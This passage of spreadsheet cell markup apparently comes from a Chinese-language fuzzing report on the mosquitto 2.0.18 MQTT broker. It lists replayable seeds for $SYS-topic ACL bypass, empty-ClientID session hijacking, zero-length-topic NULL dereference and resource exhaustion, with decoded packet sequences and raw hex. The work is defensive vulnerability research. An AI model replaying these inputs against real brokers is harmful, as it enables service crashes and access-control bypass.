        <f>== 种子标识: id:000009,sev:3,cat:020e ===\u000a大小: 964B (报告+请求数据)\u000a请求数据: 310B\u000a\u000a---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MQTT请求序列(310B原始二进制) ---\u000aMsg[1]: UNSUBACK  | raw_header=b05500044d51545404c6003c001d7465\u000aMsg[2]: SUBSCRIBE PacketID=615 Topics=['$SYS/#roker/version'(QoS=2), 'very/deep/topic/level1/level2/levelMQTT\x04\x02\x00&lt;'(QoS=0)] | raw_header=826502670013245359532f23726f6b65\u000aMsg[3]: PINGREQ  | raw_header=c000\u000aMsg[4]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1173656e68afa7bb0043d5dec24b0dba\u000aMsg[5]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F4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9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97" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J49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49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498">
      <c r="A498" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B498" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C498" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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498" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 1060B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MQTT请求序列(193B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=102 Topics=[] | raw_header=82620066362600152473686172652f67\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=68B | raw_header=33590013245359532f62726f6b65722f\u000aMsg[3]: PINGRESP  | raw_header=de00</f>
        <v/>
      </c>
      <c r="F4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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J49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49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499">
      <c r="A499" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B499" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C499" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(506B)\u000a4.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499" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 1054B (报告+请求数据)\u000a请求数据: 506B\u000a\u000a---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MQTT请求序列(506B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=27756 | raw_header=6c6c6c6c6c6c6c6c6cfa0000fa6c6c6c\u000aMsg[2]: PUBREC PacketID=27756 | raw_header=56506c6c6c6c6c6c6c6c6c686c6c6c6c\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626ff262825000a8765\u000aMsg[4]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1067006c6c6c6c6c6c6c6c5c6c676c6c\u000aMsg[5]: PUBREL PacketID=27756 | raw_header=6c6c6c6c6c6c6c6c6c6c6c6c6c566c6c\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626260726\u000aMsg[7]: (不完整,19B) raw=6c6c6c6c6c7b6c707a7a5f75736572008219a3\u000a(尾部19B): 6c6c6c6c6c7b6c707a7a5f75736572008219a3</f>
        <v/>
      </c>
      <c r="F4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9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99" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J49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499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00">
      <c r="A500" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B500" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C500" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1118B)\u000a4.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500" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 1987B (报告+请求数据)\u000a请求数据: 1118B\u000a\u000a---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MQTT请求序列(1118B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a113012600013d12000a3a4848262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626260c262626262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[6]: PUBREL PacketID=25186 | raw_header=62626262626262626262626262626262\u000aMsg[7]: PUBREL PacketID=25186 | raw_header=62626262626262626262626262622626\u000aMsg[8]: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raw_header=262626262626262626268233064a100b\u000aMsg[13]: PUBREL PacketID=28722 | raw_header=677270322f73656e736f722f23020006\u000aMsg[14]: PUBREL PacketID=12067 | raw_header=6f722f23000a746573742f746f706963\u000aMsg[15]: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raw_header=26262626262626262626261c263b2626\u000aMsg[22]: (不完整,25B) raw=2626262626262626262626262626262626482d484848485548\u000a(尾部25B): 2626262626262626262626262626262626482d484848485548</f>
        <v/>
      </c>
      <c r="F5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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J50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0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1">
      <c r="A501" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B501" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C501" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(4465B)\u000a4.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0x0305\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E501" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 9209B (报告+请求数据)\u000a请求数据: 4465B\u000a\u000a---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MQTT请求序列(4465B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=32512s [持久会话] | raw_header=105500044d51545404c07f000000665c\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3236363636363636363636ffffffff36\u000aMsg[3]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[4]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[7]: (不完整,4152B) raw=adadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadad\u000a(尾部4152B): adadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadadad</f>
        <v/>
      </c>
      <c r="F5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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J50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0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02">
      <c r="A502" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B502" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C502" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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02" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0306 ===\u000a大小: 4915B (报告+请求数据)\u000a请求数据: 179B\u000a\u000a---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MQTT请求序列(179B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(8507B) clean_session=False keepalive=60772s [持久会话] | raw_header=103300044d5154540501ed641c213bdd\u000aMsg[2]: SUBSCRIBE PacketID=10 Topics=[] | raw_header=8218000a0e13612f62220f39aec41500\u000aMsg[3]: SUBSCRIBE PacketID=2641 Topics=['$share/g3/home/+/temperature'(QoS=2)] | raw_header=82210a51001c2473686172652f67332f\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload='^\u0009²m+YÑEÙ\x92\x83Å \x9e\x8b\u00ad&amp;Î\\x1c+j*Zð\x97\x83ÀMl' | raw_header=38330013245359532f62726f6b65722f\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: TYPE0  | raw_header=0000\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: TYPE0  | raw_header=0000\u000aMsg[10]: (不完整,2B) raw=2b01\u000a(尾部2B): 2b01</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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0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3">
      <c r="A503" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0307</t>
        </is>
      </c>
      <c r="B503" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C503" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1123B)\u000a4.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0x0307\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E503" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0307 ===\u000a大小: 2942B (报告+请求数据)\u000a请求数据: 1123B\u000a\u000a---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MQTT请求序列(1123B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=12130 | raw_header=59102f628a6f6b000000806c69656e74\u000aMsg[2]: PUBREL PacketID=28270 | raw_header=636f6e6e6563746564090064d709de17\u000aMsg[3]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[4]: PUBREL PacketID=9 | raw_header=650c0009612f622f632f642f6516\u000aMsg[5]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=42B | raw_header=3249001d245359532f62726f6b65722f\u000aMsg[6]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[7]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6f6e6e\u000aMsg[8]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[9]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6b6e6e6e6e6e6e6e6e6e6e\u000aMsg[10]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[11]: PUBREL PacketID=27681 | raw_header=69616c2140232425e77677696c6c2f20\u000aMsg[12]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e4c6e6e6e6e00\u000aMsg[13]: (不完整,20B) raw=77696c6c1b1dff10ffffff0000000000401f0000\u000a(尾部20B): 77696c6c1b1dff10ffffff0000000000401f0000</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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0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4">
      <c r="A504" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B504" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C504" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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0x0385\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E504" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 5163B (报告+请求数据)\u000a请求数据: 190B\u000a\u000a---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MQTT请求序列(190B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v16 ClientID=''(102B) clean_session=False keepalive=32512s [持久会话] | raw_header=104d00044d51545410c07f000000665c\u000aMsg[2]: PUBREL  | raw_header=610173\u000aMsg[3]: SUBSCRIBE PacketID=12 Topics=['#'(QoS=2)] | raw_header=8206000c00012302\u000aMsg[4]: PUBLISH Topic='tehare' QoS=0 retain=False payload='/grp' | raw_header=300c00067465686172652f677270\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=312f23027a440227e5707008001d2453\u000aMsg[6]: (不完整,37B) raw=17a16b81edb56f7daf23d073170f2fe4e4094c46a003000174c3fa60ccd9776e44682d736c\u000a(尾部37B): 17a16b81edb56f7daf23d073170f2fe4e4094c46a003000174c3fa60ccd9776e44682d736c</f>
        <v/>
      </c>
      <c r="F5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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J50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0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05">
      <c r="A505" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B505" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C505" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(2008B)\u000a4.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0x0386\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E505" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0386 ===\u000a大小: 3050B (报告+请求数据)\u000a请求数据: 2008B\u000a\u000a---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MQTT请求序列(2008B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=524 | raw_header=5404020c5e73\u000aMsg[2]: CONNACK session_present=0 reason_code=48 | raw_header=2e230030002f012f000001002f2f2f2f\u000aMsg[3]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[4]: CONNACK session_present=47 reason_code=32 | raw_header=2f2f2f202f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[5]: PUBREL PacketID=12079 | raw_header=6f2f2f2f2f2f2f2f2f7fff2f2f2f2f2f\u000aMsg[6]: CONNACK  | raw_header=2f00\u000aMsg[7]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f362f2f2f2f2f2f2f2f2f\u000aMsg[8]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f64000000\u000aMsg[9]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[10]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[11]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[12]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[13]: CONNACK session_present=100 reason_code=0 | raw_header=2f2f640000002f2f2f2f2f2f2f2f2f2f\u000aMsg[14]: PUBLISH Topic='test/topic' QoS=1 retain=True payload='\x00\x0e' | raw_header=330e000a746573742f746f706963000e\u000aMsg[15]: PUBLISH Topic='$SYS/broker/uptime' QoS=2 retain=False payload_len=106B | raw_header=347e0012245359532f62726f6b65722f\u000aMsg[16]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[17]: CONNACK session_present=25 reason_code=47 | raw_header=2f2f192f2f2f2f2f2f2f2f2f00022f2f\u000aMsg[18]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f102f2f2f2f2f2f\u000aMsg[19]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[20]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[21]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[22]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[23]: PUBLISH  | raw_header=3000\u000aMsg[24]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[25]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f00004d2f2f2f\u000a(尾部886B): 2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f</f>
        <v/>
      </c>
      <c r="F5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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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0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6">
      <c r="A506" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:03c4</t>
        </is>
      </c>
      <c r="B506" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C506" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:3,cat:03c4)中的REQUEST DATA提取出来(1450B)\u000a4.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506" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:03c4 ===\u000a大小: 2185B (报告+请求数据)\u000a请求数据: 1450B\u000a\u000a---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MQTT请求序列(1450B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=21323 | raw_header=516f534b8040935f6d7367000966ff80\u000aMsg[2]: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raw_header=26262626262626262626232626262626\u000aMsg[25]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000a(尾部377B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F5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6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06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06" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J506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50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07">
      <c r="A507" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B507" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C507" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(422B)\u000a4.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07" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 4895B (报告+请求数据)\u000a请求数据: 422B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(422B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=1216 | raw_header=545404c07f000000665c7a7a57696c6c\u000aMsg[2]: PUBLISH  | raw_header=3000\u000aMsg[3]: SUBSCRIBE PacketID=633 Topics=[''(零长度!QoS=2)] | raw_header=821f027900000a746f6e655f75001f02\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=09612f622f632f64090018d709de17a1\u000aMsg[6]: PUBREL  | raw_header=6700\u000aMsg[7]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=13245359532f62726f6b65722f766572\u000aMsg[8]: CONNACK session_present=101 reason_code=118 | raw_header=2f6c6576656c312f6c6576656c322f6c\u000aMsg[9]: TYPE0  | raw_header=0018d709de17a16b81edb56f7daf23d0\u000aMsg[10]: (不完整,24B) raw=6963180000000009612f622f632f640903006e5b5a28736c\u000a(尾部24B): 6963180000000009612f622f632f640903006e5b5a28736c</f>
        <v/>
      </c>
      <c r="F5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07" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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0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08">
      <c r="A508" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B508" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C508" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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08" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 4890B (报告+请求数据)\u000a请求数据: 271B\u000a\u000a---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MQTT请求序列(271B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=250 Topics=[''(零长度!QoS=2)] | raw_header=820b00fa0000fa540482510106\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=3 retain=False payload='\x00\x1c$shar' | raw_header=3e26001d245359532f62726f6b65722f\u000aMsg[3]: PUBREL PacketID=26419 | raw_header=652f67332f686f6d652f2b2f74656d70\u000aMsg[4]: PUBCOMP PacketID=27493 | raw_header=726f6b65722f76657273696f6e010737\u000aMsg[5]: (不完整,56B) raw=756e7375624002000150020001a2f100020006746573742f2330130006746573742f786166746572\u000a(尾部56B): 756e7375624002000150020001a2f100020006746573742f2330130006746573742f7861667465725f756e7375622c020002</f>
        <v/>
      </c>
      <c r="F5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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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0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09">
      <c r="A509" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B509" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C509" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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09" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 4847B (报告+请求数据)\u000a请求数据: 187B\u000a\u000a---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MQTT请求序列(187B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=38 Topics=[''(零长度!QoS=1)] | raw_header=823d002600001d245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=1 retain=True payload_len=104B | raw_header=3375000b73656e736f722f74656d7000\u000aMsg[3]: TYPE0  | raw_header=0400\u000aMsg[4]: (不完整,3B) raw=0080fb\u000a(尾部3B): 0080fb</f>
        <v/>
      </c>
      <c r="F5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09" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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0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10">
      <c r="A510" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B510" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C510" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(240B)\u000a4.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10" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 5046B (报告+请求数据)\u000a请求数据: 240B\u000a\u000a---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MQTT请求序列(240B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1182 Topics=[''(零长度!QoS=1)] | raw_header=8255049e000001230c001d245359532f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=118B | raw_header=3d9501001d245359532f62726f6b6572\u000aMsg[3]: CONNECT  | raw_header=1e</f>
        <v/>
      </c>
      <c r="F5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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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1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11">
      <c r="A511" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B511" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C511" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(233B)\u000a4.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11" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0140 ===\u000a大小: 973B (报告+请求数据)\u000a请求数据: 233B\u000a\u000a---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MQTT请求序列(233B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=00b50100044d51545405c6003c281100\u000aMsg[2]: SUBSCRIBE PacketID=16 Topics=[''(零长度!QoS=3)] | raw_header=8206001000002302\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[4]: (不完整,39B) raw=7367000c66752f237b2274656d70223a32322e357de010000e11000000001f00066e6f726d616c\u000a(尾部39B): 7367000c66752f237b2274656d70223a32322e357de010000e11000000001f00066e6f726d616c</f>
        <v/>
      </c>
      <c r="F5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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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12">
      <c r="A512" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B512" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C512" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(270B)\u000a4.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12" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0141 ===\u000a大小: 5091B (报告+请求数据)\u000a请求数据: 270B\u000a\u000a---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MQTT请求序列(270B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=32512s [持久会话] | raw_header=105500044d51545404c07f000000665c\u000aMsg[2]: CONNECT  | raw_header=1500\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=152473686172652f6772702f74657374\u000aMsg[4]: TYPE0  | raw_header=000c77696c6c5f7061796c6f6164\u000aMsg[5]: SUBSCRIBE PacketID=633 Topics=[''(零长度!QoS=2)] | raw_header=821f027900000a746573742f746f7069\u000aMsg[6]: PUBLISH Topic='$share/grp1/#' QoS=1 retain=False payload_len=79B | raw_header=3a5e000d2473686172652f677270312f</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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13">
      <c r="A513" s="2" t="inlineStr">
        <is>
